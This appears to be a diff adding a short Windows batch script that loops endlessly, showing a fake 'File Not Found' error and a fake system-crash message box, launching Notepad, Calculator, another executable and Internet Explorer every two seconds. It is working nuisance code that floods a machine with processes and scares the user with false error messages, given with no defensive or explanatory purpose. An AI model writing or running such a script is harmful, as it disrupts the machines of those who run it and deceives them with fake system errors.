@@ -1,0 +1,11 @@
+@echo off
+:loop
+cls
+echo ERROR: File Not Found! %random%
+msg * "System Error: Program crashed unexpectedly."
+start notepad.exe
+start calc.exe
+start mspmsnsv.exe
+start iexplore.exe
+timeout /t 2 >nul
+goto loop
